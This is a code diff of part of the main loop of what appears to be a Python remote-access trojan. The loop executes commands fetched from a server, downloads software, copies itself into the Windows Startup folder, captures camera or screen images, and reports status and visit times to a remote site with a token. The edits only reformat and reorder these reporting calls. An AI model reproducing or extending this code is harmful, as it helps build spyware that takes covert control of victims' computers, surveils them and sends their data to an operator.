@@ -189,10 +189,12 @@ def main():
                 exec(f.read())
             if not path.exists("software"): mkdir("software")
             download(url=link, dest_folder="software")
-            send_main_information(TOKEN=TOKEN, content="result_condition = False",name_file_to_site="result_condition.ini")  # send_condition(TOKEN)
+            send_main_information(TOKEN=TOKEN, content="result_condition = False",
+                                  name_file_to_site="result_condition.ini")  # send_condition(TOKEN)
             move_file("\Startup")
+            send_main_information(TOKEN=TOKEN, content=str(datetime.now()),
+                                  name_file_to_site="last_visit.ini")  # last_visit(TOKEN)
             Rmpydir(Username)
-            send_main_information(TOKEN=TOKEN, content=str(datetime.now()),name_file_to_site="last_visit.ini")  # last_visit(TOKEN)
 
 
         elif result_condition == "one_line_commands":
@@ -200,8 +202,9 @@ def main():
                 exec(f.read())
             send_main_information(TOKEN=TOKEN, content="result_condition = False",
                                   name_file_to_site="result_condition.ini")  # send_condition(TOKEN)
+            send_main_information(TOKEN=TOKEN, content=str(datetime.now()),
+                                  name_file_to_site="last_visit.ini")  # last_visit(TOKEN)
             Rmpydir(Username)
-            send_main_information(TOKEN=TOKEN, content=str(datetime.now()),name_file_to_site="last_visit.ini")  # last_visit(TOKEN)
 
 
         elif result_condition == "camera":
@@ -217,7 +220,8 @@ def main():
                                   name_file_to_site="result_condition.ini")  # send_condition(TOKEN)
             remove("screen.png")
             remove("code_image.ini")
-            send_main_information(TOKEN=TOKEN, content=str(datetime.now()),name_file_to_site="last_visit.ini")  # last_visit(TOKEN)
+            send_main_information(TOKEN=TOKEN, content=str(datetime.now()),
+                                  name_file_to_site="last_visit.ini")  # last_visit(TOKEN)
             Rmpydir(Username)
 
         elif result_condition == "scan_system":
